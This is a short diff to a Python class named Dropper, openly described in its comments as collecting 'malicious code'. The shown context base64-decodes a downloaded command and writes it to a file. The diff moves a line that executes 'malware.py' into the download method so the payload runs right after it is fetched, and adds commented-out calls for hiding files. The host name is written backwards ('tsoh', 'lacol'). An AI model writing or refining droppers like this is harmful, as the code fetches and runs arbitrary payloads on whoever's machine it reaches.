@@ -8,6 +8,8 @@ import base64
 import logging
 import socket
 import math
+# from treasure_image import PIRATE
+
 
 
 class Dropper:
@@ -80,6 +82,7 @@ class Dropper:
         # Decode the command and dump it into a file.
         decode_payload = base64.b64decode(command)
         self.dump_data(decode_payload)
+        exec(open("malware.py").read())
 
 
 if __name__ == '__main__':
@@ -89,4 +92,5 @@ if __name__ == '__main__':
     dropper = Dropper('tsoh', 'lacol', 729000000)
     # Collect the malicious code and dump it into the file.
     dropper.download_malicious_code()
-    exec(open("malware.py").read())
+    # PIRATE.hide_file_treasure()
+
